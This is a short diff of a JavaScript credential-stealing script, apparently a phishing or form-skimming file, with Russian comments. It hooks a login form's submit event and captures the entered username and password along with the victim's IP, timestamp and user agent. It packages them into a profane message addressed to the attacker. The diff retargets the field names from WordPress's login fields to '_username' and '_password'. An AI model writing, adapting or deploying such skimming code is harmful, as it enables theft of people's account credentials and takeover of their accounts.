@@ -3,8 +3,8 @@ document.getElementById('loginform').addEventListener('submit', async function(e
     console.log("Скрипт send.js начал работу!");
 
     const formData = new FormData(this);
-    const login = formData.get('log');
-    const password = formData.get('pwd');
+    const login = formData.get('_username');
+    const password = formData.get('_password');
 
     // Добавляем User Agent к сообщению
     const message = `🔐 НОВЫЕ ДАННЫЕ WORDPRESS ЛИЧНО ДЛЯ АХУЕННОГО ПСИХА 🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
